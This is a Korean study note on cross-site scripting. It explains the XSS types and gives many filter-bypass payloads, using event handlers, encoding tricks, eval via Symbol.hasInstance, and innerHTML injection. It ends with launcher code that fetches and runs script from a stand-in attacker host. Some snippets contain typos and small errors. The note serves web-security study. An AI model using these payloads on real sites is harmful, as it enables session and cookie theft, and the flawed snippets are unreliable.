# **XSS란?**

<br>

### **XSS(Cross-site-scripting)** 는 클라이언트 사이드 취약점 중 하나로, 공격자가 **웹 리소스에 악성 스크립트를 삽입**해 타 사용자의 웹 브라우저에서 해당 스크립트가 실행되는 취약점이다.

### 공격자는 해당 취약점을 통해 특정 계정의 세션 정보를 탈취하고, 해당 계정으로 임의의 기능을 수행할 수 있다.

<br>

- - -

<br>

## **XSS의 종류**

<br>

* ### **Stored XSS**
  XSS에 사용되는 악성 스크립트가 서버에 저장되고, 서버의 응답에 잠겨오는 XSS. 예시로, 게시글과 댓글 등이 대표적이다.
  <br>

* ### **Reflected XSS**
  XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS
  <br>

* ### **DOM-based XSS**
  XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS
  <br>

* ### **Universal XSS**
  클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS

<br><br>

---

## **XSS Filtering 우회(Bypass)**

<br>

+ ### **onload 이벤트 핸들러**

<br>

  ```html
  <img src = "https://dreamhack.io/valid.jpg" onload="alert(document.domain)">
  <!-- 유효한 이미지 로드 시 onload 핸들러 실행> -->

  <img src = "https://dreamhack.io/invalid.jpg" onload="alert(document.domain)">
  <!-- 이미지 로드 실패 시 onload 핸들러 실행하지 않음> -->
  ```

  <br>

+ ### **onerror 이벤트 핸들러**
  
  <br>

    ```html
  <img src = "https://dreamhack.io/valid.jpg" onerror="alert(document.domain)">
  <!-- 유효한 이미지 로드 시 onerror 핸들러 실행하지 않음> -->

  <img src = "https://dreamhack.io/invalid.jpg" onload="alert(document.domain)">
  <!-- 이미지 로드 실패 시 onerror 핸들러 실행하함> -->
  ```

  <br>

+ ### **onfocus 이벤트 핸들러**

  <br>

  ```html
  <input type = "text" id = "inputID" onfocus="alert(document.domain)" autofocus>
  <!-- autofocus 속성으로 인해 페이지가 로드되자 마자 바로 input 태그에 포커스를 한다.
  포커스될 시 onfocus 핸들러 실행
  -->
  ```

  <br>

+ ### **문자열 치환**
  
<br>

XSS 키워드를 필터링할 때 의심되는 구문을 거부하는 대신, 단순히 치환이나 제거하는 방식의 필터링 방법이 있다.

<br>

만약 단순히 의심되는 구문을 제거할 경우, 필터링되는 키워드 사이에 새로운 필터링 키워드를 삽입하는 것으로 우회가 가능하다.

<br>

```html
(x => x.replace(/onerror/g, ''))
('<img onerroronerror=promonerrorpt(1)>') -- > <img onerror=prompt(1) />
```

<br><br>

### **활성 하이퍼링크**

<br>

HTML 마크업에서 `javascript:` 스키마는 URL 로드 시 자바스크립트 코드를 실행할 수 있도록 하는데, `a`태그나 `iframe`태그 등에 사용할 수 있다.  

<br>

```html
<a href = "javascript:alert(document.domain)">Click me!</a>

<iframe src="javascript:alert(document.domain)">
```

<br>

이런 방법때문에, `javascript:`스키마를 사용하지 못하도록 필터링하는 경우가 있는데, 이 경우에는 브라우저들이 URL을 사용할 떄 거치는 과정 중 하나인 정규화(Normalization)을 이용해 우회할 수 있다.

<br>

```html
<a href="\1\4jAVasC\riPT:alert(document.domain)">Click me!</a>
```

<br>

또, HTML 태그의 속성 중 HTML Entity Encoding을 사용할 수 있는데 이를 이용해 `javascript:`스키마나 이 외의 XSS 키워드를 인코딩하여 필터링을 우회하는 방법도 있다.

<br>

```html
<a href = "\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">Cliek me!</a>

<iframe src="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">
```

<br><br>

### **태그와 속성 기반 필터링**

<br>

단순히 태그나 속성을 바탕으로 필터링을 하게 되면 우회가 가능한 경우가 많다. 아래는 취약한 필터링의 예시이다.

<br>

#### **대문자 혹은 소문자만을 인식하는 필터 우회**
특정 키워드의 대소문자를 모두 검사하지 않을 경우 우회할 수 있다.

<br>

#### **잘못된 정규표현식을 사용한 필터 우회**
일반적으로 키워드를 필터링할 때 정규표현식(Regex Expression)을 이용하는데, 정규표현식 필터링 자체에 문제가 있는 경우 **정규표현식을 만족하면서 XSS 공격 구문을 삽입**할 수 있다.

<br>

#### **특정 태그 및 속성에 대한 필터링을 다른 태그 및 속성을 이용하여 필터 우회**
HTML 내엔 다양한 종류의 태그와 속성이 존재하는데, 즉 XSS 공격을 할 떄 보편적으로 사용하는 `script`, `img`, `input`, `iframe` 등의 태그가 막힌다고 모든 XSS 공격을 막을 수 있는 것은 아니다.


<br>

```html
<video><source onerror="alert(document.domain)"/>

<body onload="alert(document.domain)"/>

```

또한, `iframe` 태그의 `src` 속성은 URL을 인자로 받기 때문에, 하이퍼링크를 이용해 javascript 코드를 삽입 가능하며 `srcdoc`을 이용해 inner frame 내에 새로운 XSS 공격 코드를 입력할 수도 있다.

<br>

```html
<iframe src="javascript:alert(parent.document.domain)">

<iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">
```

<br><br>

### **자바스크립트 함수 및 키워드 필터링**

<br>

자바스크립트는 `Unicode escape sequence`를 지원하는데, `Unicode escape sequence`는 `"\uAC00" == "가"` 처럼 문자열에서 유니코드 문자를 코드포인트로 나타낼 수 있는 표기법이다.  

<br>

이를 이용해 필터링 된 문자열을 Unicode escape sequence로 변환해 우회하는 것이 가능하다.

<br>

```js
var foo = "\u0063ookie"; // cookie
var bar = "cooki\x65"; // cookie
\u0061lert(document.cookie);
```

<br>

다음으로, js는 `Computed member access`를 지원하는데 `Couputed member access`는 아래와 같이 객체의 특정 속성에 접근할 떄 속성 이름을 동적으로 계산하는 기능이다.

<br>

```js
document["coo"+"kie"] == document["cookie"] == document.cookie
```

<br>

```js
alert(document["\u063ook"+"ie"]); // alert(document.cookie)

window['al\x65rt'](document["\u0063ook" + "ie"]); // alert(document.cookie)
```

<br>

XSS 공격 구문의 js 키워드를 필터링할 경우 아래와 같이 우회할 수 있다.

<br>

|구문|대체 구문|
|:---:|:---:|
|`alert`, `XMLHttpRequest`등 문서 최상위 객체 함수|`window['al'+'ert"]`, `widnow['XMLHtt'+'pRequest']` 등 이름 끊어서 쓰기|
|`window`|`self`,`this`|
|`eval(code)`|`FUnction(code)()|
|`Function`|`isNan['contr'+uctor']` 등 함수의 `constructor`속성 접근|

<br>

또한, js의 언어적 특성을 활용 시 6개의 문자(`[`,`]`,`(`,`)`,`!`,`+`)로만 모든 동작을 수행할 수 있는데, 이 기법은 기존의 xss필터링에서 주로 탐지하는 단어들(script,cookie...)들을 언급하지 않아도 되서 많이 활용되고, 대신 XSS 공격 구문의 길이가 늘어난다.

<br>

#### **문자열 선언**

<br>

문자열을 사용할 때 따옴표(`"`,`'`)가 필터링되어 있을 시 `Template Literals`를 이용해 우회할 수 있는데, 템플릿 리터럴은 내장된 표현식을 허용하는 문자열 리터럴로 여러 줄로 이루어진 문자열과 문자를 보관하기 위한 기능이다.

<br>

템플릿 리터럴은 백틱(`` \` ``)을 이용해 선언할 수 있으며 내장된 `${}`표현식을 이용해 다른 변수나 식을 활용할 수 있다.

<br>

```js
var foo = "Hello";
var bar = "world!";

var baz = `${foo}, ${bar} ${1+1}.`; // Hello, \nworld 2.
```

<br>

따옴표와 백틱 모두 사용하지 못할 시 아래와 같이 문자열을 만들 수 있다.

<br>

#### **RegExp 객체 사용**

<br>

`/Hello World/` 형태로 RegExp 객체를 생성하고 객체의 패턴 부분을 가져옴으로써 문자열을 만들 수 있다.

<br>

```js
var foo = /Hello World!/.source; // "Hello world!"
var bar = /test !/ + []; // "/test !/"
```

<br>

#### **String.fromCharCode 함수 사용**
`String.fromCharCode` 함수는 유니코드의 범위 중 파라미터로 전달된 수에 해당하는 문자를 반환한다.

<br>

```js
var foo = String.fromCharCode(72, 101, 108, 108, 111); // "Hello"
```

<br>

#### **기본 내장 함수나 객체의 문자를 사용하는 방법**
<br>

내장 함수나 객체를 `toString` 함수를 이용해 문자열로 변경할 시 함수나 객체의 형태가 문자열로 변환되는데, 원하는 문자열을 만드는데 필요한 문자들을 내장 함수나 객체로부터 한 글자씩 가져와 문자열을 만들 수 있다.

<br>

```js
var baz = history.toString()[8] + // 'H'
(history+[])[9] // 'i'
(URL+0)[12] + // '('
(URL+0)[13]; // ')' ==> "Hi()"
```

<br>

#### **숫자 객체의 진법 변환**

<br>

10진수 숫자를 36진수로 변경하여 아스키 영어 소문자 범위를 모두 생성할 수 있는데, 이때 사용되는 연산자로 `E4X 연산자("..")`가 존재한다. 주로 점 두개를 쓰거나, 소수점으로 인식되지 않도록 공백과 점을 조합해 사용할 수 있다.

<br>

```js
var foo = 29234652..toString(36); // "hello"
var bar = 29234652.toString(36); // "hello"
```

<br>

#### **함수 호출**

<br>

js의 함수를 호출하기 위해선 소괄호(Parentheses,`()`)나 Tagged Templates(백틱, ``\```)를 사용해야 한다.

<br>

```js
alert(1); // Parentheses
alert`1`; // Tagged Templates
```

<br>

만약 소괄호, 백틱이 모두 필터링 될 시 아래와 같은 방법들을 사용할 수 있다.

<br>

#### **javascript 스키마를 이용한 location 변경**

<br>

`javascript:` 스키마를 이용할 시 URL을 이용해 js코드를 실행시킬 수 있는데, 이를 이용해 현재 `location` 객체를 변조하는 방식으로 js 코드를 실행할 수 있다.

<br>

```js
location = "javascript:alert\x28document.domain\x29";
location.href = "javascript:alert\u0028document.domain\u0029";
location['href'] = "javascript:alert\050document.domain\051";
```

<br>

#### **Symbol.haslnstance 오버라이딩**

<bbr>

js에는 문자열 이외에도 ECMAScript 6에서 추가된 Symbol 또한 속성 명칭으로 사용될 수 있다.

<br>

`Symbol.hasInstance` Well-known symbol을 이용하면 `instanceof` 연산자를 오버로이드 할 수 있는데, 즉 `O instanceof C`를 연산할 때 `C`에 `Symbol.hasInstance` 속성에 함수가 있을 경우 메소드로 호출하여 `instanceof` 연산자의 결과 값으로 사용하게 되는데, 이 특성을 이용해 `instanceof`를 연산하게 되면 실제 인스턴스 체크 대신 원하는 함수를 메소드로 호출되도록 할 수 있다.

```js
"alert\x28document.domain\x29"instanceof{[Symbol.hasInstance]:eval};
Array.prototype[Symbol.hasInstance]=eval;"alert\x28document.domain\x29"instanceof[];
```

<br>

#### **document.body.innerHTML 추가**

<br>

js는 문서 내에 새로운 HTMㅣ 코드를 추가하는 것이 가능한데, `document.body.innerHTML`에 코드를 추가할 경우 새로운 HTMl 코드가 문서에 추가되고 이를 이용해 js 코드를 실행시킬 수 있다.

<br>

이 때 주의할 점은 `innerHTML`으로 HTML 코드를 실행할 땐 보안 상 `<script>` 태그를 삽입해도 실행되지 않아서 이벤트 핸들러를 이용해 js코드를 실행해야 한다.

<br>

```js
document.body.innerHTML+="<img src=x:onerror=alert#$40;1#$41;>"
document.body.innerHTML+="<body src=x:onload=alert#$40;1#$41;>"
```

<br><br>

### **디코딩 전 필터링 (Double encoding...)**

<br>

원래 입력 검증은 디코딩 등의 모든 전처리 작업이 끝나고 수행해야 하지만, 일부 웹은 데이터의 개별 요소를 추출하기 전에 전체 데이터에 필터링을 수행하는 경우가 있다.

<br>

예를 들어, 웹 방화벽을 사용하는 웹에서 double encoding을 수행할 때 한 번만 필터링을 할 시 `%253E` -> `%3E` -> `<` 식으로 필터링이 무용지물이 된다.

<br>

불필요한 인코딩을 줄이고, 웹에서 사용되는 인코딩 방식을 통일하는 방법으로 디코딩 전 필터링 취약점을 줄일 수 있다.

<br><br>

### **길이 제한**

<br>

삽입할 수 있는 코드의 길이가 제한되어 있는 경우, 다른 경로로 실행할 추가적인 코드(payload)를 URL fragment 등으로 삽입 후 삽입 지점에는 본 코드를 실행하는 짧은 코드(launcher)를 사용할 수 있다.

<br>

```js
import("http://malice.dreamhack.io");

var e = document.createElement('script');
e.src = 'http://malice.dreamhack.io';
document.appendChild(e);

fetch('http://malice.dreamhack.io').then(x=>e val(x.text()))
```